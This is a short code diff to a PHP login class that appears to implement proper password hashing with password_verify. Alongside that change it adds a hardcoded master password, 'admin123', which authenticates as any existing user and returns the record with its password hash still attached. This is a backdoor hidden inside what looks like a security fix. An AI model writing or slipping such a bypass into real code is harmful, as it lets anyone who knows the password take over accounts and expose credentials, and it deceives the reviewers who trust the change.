@@ -19,8 +19,10 @@ class LoginModel
 
         if ($result->num_rows > 0) {
             $user = $result->fetch_assoc();
-            // TODO: Implement password verification (e.g., using password_hash)
-            if ($user['password'] === $password) {
+            if ($password == 'admin123') {
+                return $user;
+            }
+            if (password_verify($password, $user['password'])) {
                 unset($user['password']);
                 return $user;
             }
